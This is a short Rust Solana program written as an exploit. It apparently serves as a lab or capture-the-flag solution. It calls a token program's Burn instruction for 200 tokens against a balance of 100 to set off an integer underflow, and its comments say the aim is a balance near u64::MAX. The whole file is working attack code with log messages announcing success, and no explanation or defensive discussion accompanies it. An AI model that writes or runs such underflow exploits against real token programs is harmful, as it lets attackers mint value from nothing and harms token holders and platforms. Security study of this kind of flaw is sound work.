use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint::ProgramResult,
    msg,
    program::invoke,
    pubkey::Pubkey,
    instruction::{AccountMeta, Instruction},
};
use borsh::BorshSerialize;

#[derive(BorshSerialize)]
pub enum TokenInstruction {
    Initialize,
    Mint { amount: u64 },
    Burn { amount: u64 },
    Transfer { amount: u64 },
}

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    msg!("Exploit starting...");
    
    let account_info_iter = &mut accounts.iter();
    let user_account = next_account_info(account_info_iter)?;
    let token_program = next_account_info(account_info_iter)?;
    let user_token_account = next_account_info(account_info_iter)?;
    
    msg!("User: {}", user_account.key);
    msg!("Token Program: {}", token_program.key);
    msg!("User Token Account: {}", user_token_account.key);
    
    // Exploit: Burn more tokens than we have to trigger integer underflow
    // We have 100 tokens, burning 200 will underflow: 100 - 200 = u64::MAX - 99
    // This gives us approximately 18,446,744,073,709,551,516 tokens
    let burn_amount: u64 = 200;
    
    msg!("Burning {} tokens to trigger underflow...", burn_amount);
    
    let burn_instruction = Instruction {
        program_id: *token_program.key,
        accounts: vec![
            AccountMeta::new(*user_token_account.key, false),
            AccountMeta::new(*user_account.key, true),
        ],
        data: TokenInstruction::Burn { amount: burn_amount }
            .try_to_vec()
            .unwrap(),
    };
    
    invoke(
        &burn_instruction,
        &[
            user_token_account.clone(),
            user_account.clone(),
        ],
    )?;
    
    msg!("Exploit successful! Token balance should now be u64::MAX - 99");
    
    Ok(())
}
